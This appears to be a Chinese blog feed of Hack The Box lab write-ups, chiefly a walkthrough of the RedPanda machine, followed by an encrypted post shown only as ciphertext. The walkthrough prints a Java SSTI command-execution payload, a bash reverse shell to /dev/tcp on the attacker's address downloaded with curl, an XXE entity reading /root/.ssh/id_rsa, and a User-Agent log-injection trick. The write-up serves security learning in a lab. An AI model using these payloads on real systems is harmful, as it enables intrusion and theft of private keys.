<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409200452.png" ></p>
<p>成功拿到hash，然后再登陆，成功拿到管理员权限</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409201438.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>思路：网页发现用户名–&gt;生成字典–&gt;查看是否有用户不需要Kerberos 预⾝份验证–&gt;拿到第一个账号密码–&gt;提权工具找到自动登录的账户密码–&gt;查看域内信息–&gt;发现DCSync 攻击–&gt;抓到管理员的hash–&gt;提权成功</p>
<p>新的知识点：Kerberos 预⾝份验证，自动化提权检测工具，DCSync 攻击。。</p>
<p>本来想试一下BloodHound查看域内信息，总是失败，不过看官方题解也能懂，可惜就记录不下来了</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb RedPanda复盘</title>
    <url>/2024/09/24/htb-RedPanda%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─# nmap -sS -p- --min-rate=2000 10.10.11.170</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-24 16:21 HKT</span><br><span class="line">Warning: 10.10.11.170 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for 10.10.11.170</span><br><span class="line">Host is up (0.62s latency).</span><br><span class="line">Not shown: 64603 closed tcp ports (reset), 930 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">8080/tcp open  http-proxy</span><br></pre></td></tr></table></figure>

<p>端口扫描扫到8080端口，直接访问，有个&#x2F;search，然后目录扫描也能看到&#x2F;stats，可以看到一些图片的路径，还有两个作者名字，还有一个可以生成xml文件（没什么敏感内容）的功能</p>
<p>然后看到网页源代码可以知道这个是个spring boot应用</p>
<p>主要针对这个search，尝试了sql注入，无果，后来看到了官方引导，才知道存在SSTI（下次应该自己试出来）</p>
<h4 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h4><p>输入<code>*&#123;8*7&#125;</code>，回显56，验证了ssti漏洞，在hacktricks找个payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#x27;id&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>

<p>可以命令执行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924163217.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─# cat /var/www/html/a.sh</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.14/8888 0&gt;&amp;1</span><br><span class="line">编写payload</span><br><span class="line">*&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#x27;curl http://10.10.16.14：9999/a.sh -o /tmp/a.sh&#x27;).getInputStream())&#125;</span><br><span class="line">*&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#x27;bash /tmp/a.sh&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>

<p>成功拿到shell</p>
<h4 id="靶机内信息搜集"><a href="#靶机内信息搜集" class="headerlink" title="靶机内信息搜集"></a>靶机内信息搜集</h4><p>&#x2F;opt文件夹下面有挺多东西的，要耐心翻找</p>
<p>在<code>/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java</code>文件里面能够看到woodenk用户的账号密码，拿去登陆ssh，可以成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924164021.png" ></p>
<p>然后实在太多东西，我跑了linpeas和pspy，主要是pspy64，可以看到</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924165009.png" ></p>
<p>root有执行有关final…的jar包，在&#x2F;opt下面，woodenk用户还会定时删除xml文件</p>
<p>把jar包scp传输到本地，用jadx反编译了一下，看到了代码</p>
<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924165726.png" ></p>
<p>需要审计，这部分我就是参考别人的wp努力理解可以怎么利用漏洞</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> JDOMException, IOException, JpegProcessingException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">log_fd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/opt/panda_search/redpanda.log&quot;</span>);</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">log_reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(log_fd);</span><br><span class="line">        <span class="keyword">while</span> (log_reader.hasNextLine()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> log_reader.nextLine();</span><br><span class="line">            <span class="keyword">if</span> (isImage(line)) &#123;</span><br><span class="line">                <span class="type">Map</span> <span class="variable">parsed_data</span> <span class="operator">=</span> parseLog(line);</span><br><span class="line">                System.out.println(parsed_data.get(<span class="string">&quot;uri&quot;</span>));</span><br><span class="line">                <span class="type">String</span> <span class="variable">artist</span> <span class="operator">=</span> getArtist(parsed_data.get(<span class="string">&quot;uri&quot;</span>).toString());</span><br><span class="line">                System.out.println(<span class="string">&quot;Artist: &quot;</span> + artist);</span><br><span class="line">                <span class="type">String</span> <span class="variable">xmlPath</span> <span class="operator">=</span> <span class="string">&quot;/credits/&quot;</span> + artist + <span class="string">&quot;_creds.xml&quot;</span>;</span><br><span class="line">                addViewTo(xmlPath, parsed_data.get(<span class="string">&quot;uri&quot;</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>main函数按顺序调用几个函数，都是在上文自定义的</p>
<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">parseLog</span><span class="params">(String line)</span> &#123;</span><br><span class="line">        String[] strings = line.split(<span class="string">&quot;\\|\\|&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;status_code&quot;</span>, Integer.valueOf(Integer.parseInt(strings[<span class="number">0</span>])));</span><br><span class="line">        map.put(<span class="string">&quot;ip&quot;</span>, strings[<span class="number">1</span>]);</span><br><span class="line">        map.put(<span class="string">&quot;user_agent&quot;</span>, strings[<span class="number">2</span>]);</span><br><span class="line">        map.put(<span class="string">&quot;uri&quot;</span>, strings[<span class="number">3</span>]);</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>parseLog函数就是读取<code>/opt/panda_search/redpanda.log</code>，然后把里面的参数用｜分割，再保存，形如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">405||10.10.16.14||Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0||/error</span><br></pre></td></tr></table></figure>

<p>然后再main函数返回那个叫<code>uri</code>的参数，后面要用</p>
<hr>
<p>接着往下时getArtist函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getArtist</span><span class="params">(String uri)</span> <span class="keyword">throws</span> IOException, JpegProcessingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fullpath</span> <span class="operator">=</span> <span class="string">&quot;/opt/panda_search/src/main/resources/static&quot;</span> + uri;</span><br><span class="line">        <span class="type">File</span> <span class="variable">jpgFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fullpath);</span><br><span class="line">        <span class="type">Metadata</span> <span class="variable">metadata</span> <span class="operator">=</span> JpegMetadataReader.readMetadata(jpgFile);</span><br><span class="line">        <span class="keyword">for</span> (Directory dir : metadata.getDirectories()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Tag tag : dir.getTags()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (tag.getTagName() == <span class="string">&quot;Artist&quot;</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> tag.getDescription();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;N/A&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个函数先将<code>/opt/panda_search/src/main/resources/static</code>和uri参数拼接出一个路径，加载那张图片，然后使用JpegMetadataReader读取图片里面的详细信息，相当于exiftool，如果图片解析出来有<code>Artist</code>字段，就返回，如果没有就返回空</p>
<hr>
<p>最后是addViewTo函数，path在main函数拼接好了，就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/credits/&quot; + artist + &quot;_creds.xml //artist字段是前面函数返回的</span><br></pre></td></tr></table></figure>

<p>这个函数主要是解析xml文件，增加图像的计数次数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addViewTo</span><span class="params">(String path, String uri)</span> <span class="keyword">throws</span> JDOMException, IOException &#123;</span><br><span class="line">        <span class="type">SAXBuilder</span> <span class="variable">saxBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">        <span class="type">XMLOutputter</span> <span class="variable">xmlOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLOutputter</span>();</span><br><span class="line">        xmlOutput.setFormat(Format.getPrettyFormat());</span><br><span class="line">        <span class="type">File</span> <span class="variable">fd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> saxBuilder.build(fd);</span><br><span class="line">        <span class="type">Element</span> <span class="variable">rootElement</span> <span class="operator">=</span> doc.getRootElement();</span><br><span class="line">        <span class="keyword">for</span> (Element el : rootElement.getChildren()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (el.getName() == <span class="string">&quot;image&quot;</span> &amp;&amp; el.getChild(<span class="string">&quot;uri&quot;</span>).getText().equals(uri)) &#123;</span><br><span class="line">                <span class="type">Integer</span> <span class="variable">totalviews</span> <span class="operator">=</span> Integer.valueOf(Integer.parseInt(rootElement.getChild(<span class="string">&quot;totalviews&quot;</span>).getText()) + <span class="number">1</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;Total views:&quot;</span> + Integer.toString(totalviews.intValue()));</span><br><span class="line">                rootElement.getChild(<span class="string">&quot;totalviews&quot;</span>).setText(Integer.toString(totalviews.intValue()));</span><br><span class="line">                <span class="type">Integer</span> <span class="variable">views</span> <span class="operator">=</span> Integer.valueOf(Integer.parseInt(el.getChild(<span class="string">&quot;views&quot;</span>).getText()));</span><br><span class="line">                el.getChild(<span class="string">&quot;views&quot;</span>).setText(Integer.toString(views.intValue() + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(fd));</span><br><span class="line">        xmlOutput.output(doc, writer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里就存在XXE漏洞，在网站点击导出表格的功能时，就会触发，而且在这里解析的文件路径path是可控的，我们可以通过控制uri的值，控制 <code>artist</code>值</p>
<h4 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exiftool shy.jpg -Artist=&quot;../home/woodenk/aaa&quot;</span><br></pre></td></tr></table></figure>

<p>先自己准备一张图片，用工具增加Artist字段，然后上传到靶机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">woodenk@redpanda:~$ cat aaa_creds.xml </span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY pencer SYSTEM &quot;file:///root/.ssh/id_rsa&quot;&gt; ]&gt;&lt;credits&gt;</span><br><span class="line">  &lt;author&gt;damian&lt;/author&gt;</span><br><span class="line">  &lt;image&gt;</span><br><span class="line">    &lt;uri&gt;../../../home/woodenk/shy.jpg&lt;/uri&gt;</span><br><span class="line">    &lt;hello&gt;&amp;pencer;&lt;/hello&gt;</span><br><span class="line">    &lt;views&gt;4&lt;/views&gt;</span><br><span class="line">  &lt;/image&gt;</span><br><span class="line">  &lt;totalviews&gt;4&lt;/totalviews&gt;</span><br><span class="line">&lt;/credits&gt;</span><br></pre></td></tr></table></figure>

<p>在靶机新建一个xml文件，里面使用到文件读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://10.10.11.170:8080 -H &quot;User-Agent: ||/../../../../../../../home/woodenk/shy.jpg&quot;</span><br></pre></td></tr></table></figure>

<p>curl访问，增加字段到log文件，这一步是在控制uri</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">woodenk@redpanda:/opt/panda_search$ ^[[A</span><br><span class="line">cat redpanda.log </span><br><span class="line"></span><br><span class="line">200||10.10.16.14||||/../../../../../../../home/woodenk/shy.jpg||/</span><br></pre></td></tr></table></figure>

<p>因为我们在UA头前面多插入了一个||，这样本来是第三个字段的ua头被我们控制成第四个，也就是uri</p>
<p>最后访问网址触发功能点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://10.10.11.170:8080/export.xml?author=damian</span><br></pre></td></tr></table></figure>

<p>等一会，再查看aaa_creds.xml，就能看到我们要读取到内容，接下来就是用id_rsa登陆root，结束。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924191714.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机还挺有意思的，第一次接触java的ssti，虽然这次是直接套payload，然后靶机内信息搜集也挺需要耐心的，代码审计触发xxe漏洞那块，一开始看wp还感觉很麻烦，自己写复盘一路顺下来才理解，学习了。</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-Heal笔记</title>
    <url>/2024/12/20/htb-Heal%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="295bfc1a15dcab86d65e99f7e6ae9d23e579558b6480a9a0ea72d457c162f9e1">948d3a4d19e8bce16b53ccf2f5ad6f1a0f2e318246b5c9ffb29f08d8de963c319a99b114f15655a820fd489c6d601bc2f92ac36241141f3fe38a01f0e8a91630b344fb1de001a7e67c838011f0c402fd9a1982283683860961298529bcd2bc3fc5b2df9ff1cc909bf291471049d56a31432a5a7dd3fc98681b168be1310a67e8764add7536de1443c617c4368c245f353821149c9f5c3d96e98526bd8152d92856bb2f35e47db3ef7eef0e44554d4a249b34a91e68b4ba7413d70c19ad6444cb7d4068c535164abda8050d0ed98496643b6aee925161536417ec9bbb645175242ab0c2e1a60d0299c5ba355b9468424c9e0a430575bf1caa8d0e18b2a0bcde3408fb497a81b17a5237e34d802a79ae454ab699fd6b8ec9482bc70eadd25628c910a2677a9c3faa06d668aea8fc94dc167a2875f79ac8ba70998780c30e39e7b68bf1bbaf5d90e3cbc8a0bb55829b7c2a576e21abc7647131705504f91cbbc02a64930eda299f27cbceeccdd75121d6c5074343b04fb3aaef08381fbfe87207dac473382dbd5ab0ff9f10982ce5ea428d00c00994e17ab44d68b94a9ca0846ca85b8abb2dc1b2179abb465d07c01c07d5a5442fff882ee457fd72cccde2e5b150bedd35d7df0cb00ca6136a0645d5f84322b967c4ded3936658bab2d3b9180f6efe5cb3a63351c1dd37c668044e112a01aa4c8d9f8e0243247a6efb6c06e60da9aae1a47a6f6303f2ebb7d5b50543bdb296f69ddbfdb5835d3235afe794a941bc65d4611ed3a80c980acef9c3d79f207ff453edcc77507dc13ef130482a829ac65e39efd4d2a89985a9e09b789eb0842905d6ad4d8120ef8e615fdeaa94cc239a5349a42c65a2ace95ceffd514d0c995cb77afb86a4d2ff765012ec849b49cf8592e1b7c2400b164de46642bf212c2e0af92c4ac71cd9915aa3117707384b36e343902a183ac316f22caaa501631da98cac7df55a7cf4b47ea4c668aa0301f3d3326dc468108b9b1989a5e0d9ab89314f8dbe4054025871b6f2811bedce8c20cca9f31d80dabcff20967d0ae14902212615cadf961a9ac8be22cd29e4a5997c3286d683d5474a9871a6f13923524cc3a5e98c7af834ae7a2ae88ffa3c9a3d6d2948275b5c12a9725c0792caafb5491cd2c344320ec0659df418c0e89271ec0a554288c89dc7e6b9014d8558c49277e7abebb609ba2ec8169b01060e60436a0550d2b5f2fe6764c5abf3602f960d9d4022c15d72027f22ac3401e6afc3065add0abea826813af51640a466538ffd9e8c6cb4f9e0b38a315c1bc4be7791889eba717f147184d84af120c83be6e75d893990ac73853121bf2a43dd7b565ffb9c540a4f6cb7c446e252114d6133f2d7eacd95caee127cac88361639e8b214b487b2eabfee390f22d0e74e04105be79179f0f189e0ab248720f29f0b5dd62b1a1ba4418d48637acd1d66cc34eac1f13c09652224e68cb4c3e69d47407c3dbad5f277d619a2e8c79afd33c43a7fef7235bae70fb7b425cb43633f75386cd1f98d98ae995982d4c36c7270a239a43b2b47381dbc80ab168426dd89e3eb9723b3c8c37d56f815c5d3475c0d89c3e199217e2ef60a5cbb1b193b9e8e61a01444c0a7f6fc2b88247606ed5ce8cf153ad70865ed0b7128a1052d9fcb4e19344f1ddacc59a751959ff51603533dc3d94ef6bf6e1751b2058be7e02b05277a9f230351e8ee121af3166bd8e7a95230e55ec3e64921f790de7f68b88b38cc38828a1ed4dc61bce1f5bdb6e7837cf136ddf4e35f8aac655d9e2a346b10ab433e8f39ce283d688ff3087337bccdd734c514c97d436c6edce3be8ffc040da4000b698a6ebb56c499f77fde39842f7d922bf6939ecfb993d678891e9813516cd2fbeaeadc5350048b07a2e78e5fc289b24b4ac772e7e24debabfdd3652b4ee91a880a582baf97d0ce6af05e54a0941e4469a841d0308f7042e8c7645a73559c72dd28847f37fba047202da345f3331aadeca4f089f5c24533f6635c552e588f88d06d11460a4aca250fed129a24d8d66ccc8c5bf12d814453ae1f239afe165b1b8bbfdc6fef1b1e9a6a1f1212d2be22933a369cd0aa08cb51b46f1fdb47fd3a38dc66659f86cdb3a63a2cc9531bfcf45ce3ba2452323bb78d4a337a60db5e57439145c2b425afa1634d1f7d63e06750e9bad26732d295552b62ac9497a4ea7a9c0efced69a3c2620c239146df6b8dfba25c260be9ab7bf5d02cf18058efba3ddd78c153de744afb7a77a47984391c91728cedacf9e5782bd627fcb378af7abd6f3f73239b5cb9ef7f0ae21e95803868ed612cf31465c2a35e8f72419555f3f9a1e826c5d4ade4b747cf112e3858294de2b693fa81e7972132eb299ee912d10518057103c3a2fcf780a3c0b5ae23aa6f950e6ac62dc1468bc9a092e7766e2f542726e65bb17955ad25f60715ab8e7e0e3a9bcdb9e0314d779cbb4138f8b090d66b681b60c367e95c139661a483b2513dc441be674d7b8698eaedd73e219ad9cad9490c0d31a9383ad6f18ce1ffd56f53d052bb74a418cae529a15ca9295cc735775d9e2e999111a1077cf4bcc473bbade20c662c7ec35ba3231b26e2efb75b4511ef94622a07ab37401a13ea68967db8215cf3f1c940d78f35cb27b15f7214ffb8073ff2bf975648b36e90c01bf49e15d1cdddfad5dacbd5c1e12b5679d29ed18f96436ba7c179247f2e20566de00ef7335e935b17b39d6651ac0d9ceea1c1062cdcc563cdc391af59ab8c58d2c0185f56cbc3ab500df2c9fc7e12e2ddc0847e2a87d723b6c3b6cc723ceb95b7e9e354ae8ac913d48d54c224519887d0f2ae256774e1f5c83774b0b1a7a0922d7b7008ae801836f01fe6ef04258b537dde1e3d5bf448e8ffa3455c7bdcbbba3749d64ae1db34a265e8c376e5602d46553db34b4ad738bd50c887c93f09cce0b0d3b5387dcf02330152e9c43c9dcc280c6d4785369afcea42cfe8c21776ee327fa4f221d33d3dff5b063755c80164ca02a47ab1631641ffeddf7efd0eff85a97d96591d8c58d64e9c398d90262642767bff890cede9b76612a1864ee3ea8fc87cbd225dbe866b33fc8b31ee43b854c108dfee06e05e5e26d0be64f07137820343bb4d47d431c3f12ee15b14fb9a9423edbea999d9eb67efa83d57e04e88268041a014a955dc702e53eeb9ac56c4267d83c159613f18a49f491c752534313877bd3e86811401b5dbe063746291513365261d0702a1321ce999223e42d0881d1a202a8aa8dd5667408d3f74e218ebed3e59b8132531631ac6eae8b9659d50b52364aceef0e6481e3dbc242c5c9afd6e2bf1d25e8fcbe4a2953e0c88b4c99e9999bdb16e11349176eb1e5d9a7918540853dde699af4d73230acefb5270e142bcd967a5c76e5176e88543ce6b6defddcbb404cb8e656d85d996b851643987d1e3f82b536d82aa57e63406db32bfd638a17db2ef0d0aaf5180fd85b6ceb777dce2fdf0cde188ae6dfb0453683fd2077aa47ccef985666cee94e40f0737ee47c8c21596714cb2b0ad6eb85e9283ed97c5ebd06fb58df17ed92034c72772cb7bae91713f9f297b0b9f57d66af863e690d111cdcac9502b0ad65d38792bb941c583dc8818b520c93601f3972729d6168cea4217a8a1954b47d3b548f9656271e9c1ff7b347cb9f04d30b7aaffc44d32f308e0a7572ca2c42c9995dafb00dde183c5dc87b80aa57936414dc006dd62653fd6c08658a0a4af375d006eccfcfd8744479c34afde6780e6d1beb93cd24bb5629d1946e25e3238d1d45d7a196adc367a2ddf3563737869175c67eff101ec7a7bd3c901a9d4f2f09b5261ffe36a17b5564c451aea200394b4aacf048a593f2b9c04d49ff8dfa16986128d9d87d3180f0e7bb1ce315218c1220bcc15ba186e5558f53a9884b3f158467d831edef857d1a6ae85236f4800fae3ae535fa6ac783d16f9ee72780ba9cb25ff51436b2a78dd17245ddd5b1076f1f49bca87ee1ddf100c8d3ee77e07b12fb4ae872d94d5853a16bd46bed15aa77616f428a671a04b73ea2e6739ce275a63878c71a686ea090771005a9c55c68a6c6759da061a5a6e817b6e13d6f65048873a3784054f64c4d9fb9bb7483c12d9f3bffeb247862f6caf889a76444f6adb3d4d447ed28faf162d8a3b66ee1a69068a9dee602d25c18902d830fa04e14381989c52a2fd9437fa26eb6165cae387e8e45a8d4a5f99e7a7622220dbbfd754bfec4c9b6ee27625277ef01bcf7409deb99a02914000f0a8c1cbddd75e90647bdf0949cd6cc391d6ed290069cd28d3fe468208127236840ad01f1dd9e85dc06d8d64f50ac2ce3b5e9e64fbc10bff1be37dc18853fbe727873af30e6f7e6ceec377b44a8c9026a086113cb7bbdcbe74ed90e02f2fb51e877c5b61b166bd9af7648523c21e63019d9cac81edee1b684bd7badc4fc3604f7b870becbb88d499eb04a4d9aac0444a3cb1425474b2355821b828d684889e7f450b875d5436dacf6ed196c97508f5382e6245b3920686d706aacbe740fee046b80c0206cb48c0a41e52138cb728666ddf73b5d30762ad623203caed183c641e93fb9bf08caeba7615c98450372650a88536ca658c9a7f14bbff685a2363e21ed11eafb6bf3797f111f8eab100d3173c50d19db59d65e859a8dd21fbe296c688f3b5a13aa27534fcdb9ab673cbb2c88b62860461d80dce5fc31a4ef8ab130dbe042b4ddda34c7e1471809de85de50041508f113c659f6f7f8c9a77f4a7d47d7f85fef644aa576127535b89a5e7c610778654da7ebbbbd14871db6f354207dde509a238c556973ebb79cb27dab27c30642a93b9e949517f95eccda22ff8889fab5fda930a7eefc331994f0009f7557c979ba2c87ca14f43bf1e846b5319e7c0c0ee47053244fdcadbfc572fb963e65f9a13822adcd98ac4aac540f42eeb13de4ba683ddf324adbc8d80401e5e0d76694bbffe49356e6712fa3b225e3bd3538c10fb5536b450567276b08c0a8640f7a6c0a3aa4e9a58222d9e96cad02426ae1fc54c16747e5da2130f743528b07141b9eace3717cb694ad09aaca457b8a11e363471bf72199b77ec0775e83ba4a5b08b8c7b696e767f948f64a56e815d1fc918fcd8b9e09d65988e62a0f173b84b4b6d7e38b3e4e01e926d51360e54768361c123bcea2a71665e597203b7f5dfe801701392b640df21f59bad13a3ec531db80d88f5bc32bc1a79aaf22aede1645f15741dc53d11608523ac6c02099534499426a27bf2ec7769fc5859acbe0f51ae6124a1fa1cf2537a441bd1f66104d319f009dba5dd7e078893c323925b68a3694813ae9cbc6f34e9821c29d6d4fe4ee065409fd8fb830f96ae4a9daedd30ff3bbc825e472bd33bb86d9f7d8838fe5b0f90eb5974969f33432399d6ff46a7849dbe7b4e31a046bd1f07231a444d79e6f00e739b6c9987e7865325602263b284b5d9bd9cd7d8a95b561d8a149a628ea0afd65dafb0e3cca32d33f63fce039f140757bc694c9d7a922caf171cf910b30c16c40a097b73e9f3c4fb1d258e123dc187585438dbbb54c68178606bdd87103d636ec60ae4fdf0ad4c50e49577b001313890b369bf8205ab0ea5dfbba53b7b984b90dcba2b498a3e287ff4329b520379473a60c3f3848c487b0369aa99239b9f19dfd94baa41cdaaf3cd4d4f33a104cb4672089f32143f7ebed330c10b5ca1925be96ff29fe0f6c8c8760537ed606b1191a3feef26326dc4e0c5a6c6185a9021e67f2620d95afd647db6d71579522a5f87358f72d3506c9d63f8a30ac2c3b25081ea41405ba6aa72e740cf059cc678e2d3c2d8ecf894bbe6f2a2810d3b85d6800327efa34bbcb86bb09eb6ab9be6e2606ba5623d239c1fbe2ea3b39e034fd6ebfaf17683d664ec2aced3f8e3ca203e49595a1a322ce672e50801f8767c738042d6f0ae1a1a9ded55a558a8e571fe6aa5e228688f7dcbfc5347f1d89797cb7ff1e7ecb99a62630ed5346ca0927efca80c9644851ea2b2a6228baef98f5cb686f4aa4ec24eeadd4918ec424112278aff0ecd57c3f8527e059abb6bf8760d16f47f0f95cb7e1d4c169dd0767591d75173c61372414c2a091d940b7936503af3d8d7fdab63d84eb9e62c503469c7fafb9d5fee0283607726f376e7b46fb5d7aa61921763b19ff2d70b32ab71dc5d0bbf8c7e47f56a43934edfd386cc58165f6c4047d9689b559cfb335046e3d31b2d8aa7e0de3c84e23505a01079ed348fea0d3bf0d2a8e9fcd092bdfa080229acdd31f4f43ddc0f5667fcd4e0c1ef893f329fbb63b7cdaaa7402a3f8b7a01b7b803f3474c2c4ff5ed2745cd2890d24647df4d524b05ebbae68e304991f354c0d0ed1fef9a1cb09fae7457404106082efbf9a4a61d4064a2885e9891dba9dc64c01cf83f50960333e4e8fc2b96eb340bcf469017d40844316a1472fd33449f27030b1ebdc32ca9632079a9cbd4a5b64b47272e364cd5934e2820da2985d6d1e243aea2ec057fc3f1a7a0a2efefa727b3d21e5430001bdf5255b4a40aaf94440ac32ba83e5b0e8202804d64a078e016415f82fbfabbecc4ab98922e0acfea7dca63e97ae8dfd76f13358e30fd03a1afa2b75664f674984abc93a0bdd800edcfc08785d7432f13c1cf9eaf0709b2c050bc625f9621cc0ab65b5f021b733d1e631d46a5d5310884b1221dde804a01e8dfb73ea763e33877b0ee92b35aedc498512e8a8834dd78346e4bfcc1a6d1b1969179db516978d548f417d41a2356f0b183d91838b59770916db56c6affc2315f4743d461a06a01fae5d56a3bbc32a2ca9b915cfe107bbc4040dff08c78a8770f9b73a26f9524ef87d2a32ae41de23e18857b4a93d13b6de676d3034d9fbc306053241050b6c545fca49be1acba072e126d059f72fe729137e8098f28048b456ac7f9781757c856ed0439f5279d33010fdbc2bd36791816c3f546eeb5a031936a9f3c3463c9d0d125a831b5948d5b7088ac33cf7d8fcbd2c48b534f2129ae4d1b86566667e21facb0292e76bb9b3912f4caa96b7ef1fdd509c64cd72ba694ff2232be3a01a4e97d1cc267e52bb2e2e38ab76a78e7acbd1cc0332308e874fa5498eb3d8cd09a6a92fafd9811a6fd00495fc1b9d28df86ba8819da1ea6e7b88cb11f612d84e306f5bcf4c9b369e773eed02bc75c7a840921bee31e061599b9136e63c07fd49b2befac08f617820e9aab02473e8b82049cc0eff778a8e652ef57161a62f03a9baf4059dea89a5bd9de6231e149c7c0e198aa2eeb6ed604f54bc7aab41825ac6df80418240b55e9d513a664ced381d4a70fcd7ced730882836345676e09bb56a7cd64c1e83a7778dbd7881013d7ff7bb1dda990bc14fa952c3356ce5ca64dd9634dd330fd40c8441231464cdb980fe5fe76c910ca52bcbc5c1f77575efa40875415170cc80e7976708cf3e394dd8d562f9993b832e5e9ee13e4382e666484b4a123af6f06c3a5196d0c82ca9e647d823734fef30353a58f4867fc7ff5d95c245699a0ae1f82c61030b93057adeb3ea166d2dee16fe4f909e2c9f70fe55fe2fe6980f3827c72d706f3709af5ab19643d06bcf74d10586d2eb4f8d28adaf6e2e1d9a41e75e1bc79e41a1b139d1e647a8f57c304298c3fbd354fc52d064f9568af56862fc5c9af11104cfa67169c8456425d71a705ef215